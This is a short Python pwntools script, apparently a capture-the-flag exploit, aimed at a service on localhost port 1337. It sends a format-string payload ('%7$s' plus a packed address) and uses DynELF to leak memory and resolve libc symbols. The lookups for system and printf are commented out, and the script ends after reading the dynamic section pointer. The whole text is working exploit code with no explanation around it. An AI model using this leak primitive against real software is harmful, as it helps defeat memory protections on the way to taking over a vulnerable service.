#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *

HOST="localhost"
PORT=1337
context.clear(arch="amd64", os='linux', log_level="info")

def leak(addr):
    payload="%7$s.AAA"+p64(addr)
    r.sendline(payload)
    print "Leaking: 0x{:x}".format(addr)
    resp=r.recvuntil(".AAA")
    ret = resp[:-4:] + "\x00"
    print "ret:", repr(ret)
    r.recvrepeat(0.2) # receive the rest of the string

    return ret

if __name__=="__main__":
    r=remote(HOST, PORT)
    d = DynELF(leak, 0x40060d)
    #system_addr = d.lookup('system', 'libc')
    #printf_addr = d.lookup('printf', 'libc')

    #log.success("printf_addr: "+hex(printf_addr))
    #log.success("system_addr: "+hex(system_addr))

    dynamic_ptr=d.dynamic
